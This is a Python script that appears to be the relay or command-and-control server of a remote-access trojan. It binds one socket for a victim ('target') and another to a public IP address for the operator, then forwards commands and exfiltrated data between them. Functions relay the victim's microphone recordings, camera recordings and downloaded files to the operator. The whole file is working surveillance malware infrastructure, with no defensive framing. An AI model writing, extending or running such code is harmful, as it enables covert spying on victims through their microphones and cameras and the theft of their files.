import socket
import struct
import pickle
import cv2
name = socket.gethostname()
ip = socket.gethostbyname(name)
print(ip)
#threading.Thread(target=timezone).start()
print("Welcom To The Neo")

con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
con1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True :             
     IP = "127.0.0.1"
     PORT = "2334"	  
     try :
          con.bind((IP,int(PORT)))
          break         	
     except :          
          print("your ip or your port is useless")	       
     
con.listen(2) 		      
print("actived successfully A") 
clienttp , addr= con.accept()
adrest = (str(addr[0]))
print("connected to "+adrest)
info = clienttp.recv(1024)
info1=str(info.decode("utf-8"))
print(info1)
            
while True :             
     IP = "185.231.112.68"
     PORT = "2336"	  
     try :
          con1.bind((IP,int(PORT)))
          break         	
     except :          
          print("your ip or your port is useless")	
	       

con1.listen(2) 		      
print("actived successfully B") 
clientcp , addr= con1.accept()
adresc = str(addr[0])
print("connected to "+adresc)
info = clientcp.recv(1024)
info1=str(info.decode("utf-8"))
print(info1)
def download():
     print("Start download")
     clienttp.send(b'1')
     while True:
          print("recv from target")
          ri2=clienttp.recv(4*1024)
          if 'opsl()' in str(ri2.decode(errors='ignore')):
               clientcp.send(b'0hibye1')
               break
          print("sendto client")
          clientcp.send(ri2)
          print('recv from client')
          #ri = clientcp.recv(1024)
     
     
def Record():
  ri5=clienttp.recv(1024)
  print("sendto client-----")
  clientcp.send(ri5)
  ri6 = clientcp.recv(1024)
  print("send to target-----")
  clienttp.send(ri6)
  while True:
     print("recv from target")
     ri2=clienttp.recv(4*1024)
     print("sendto client")
     clientcp.send(ri2)
     print('recv from client')
     ri = clientcp.recv(1024)
     if 'opsl()' in str(ri.decode(errors='ignore')):
          clienttp.send(b'ends')
          break
def camcord():
     while True:
          print("recv from target")
          ri2=clienttp.recv(4*1024)
          print("sendto client")
          clientcp.send(ri2)
while True:
     print("recvfrom client")
     ri = clientcp.recv(1024)
     print("send to target")
     clienttp.send(ri)
     if str(ri.decode(errors='ignore'))=='Voice_Recorder_file' :
          Record()
     elif str(ri.decode(errors='ignore'))=='Record_Camera':
          camcord()
     print("recvfrom target")
     ri2=clienttp.recv(4*1024)
     if str(ri2.decode(errors='ignore'))=='0download1':
          download()
          continue
     print("sendto client")
     clientcp.send(ri2)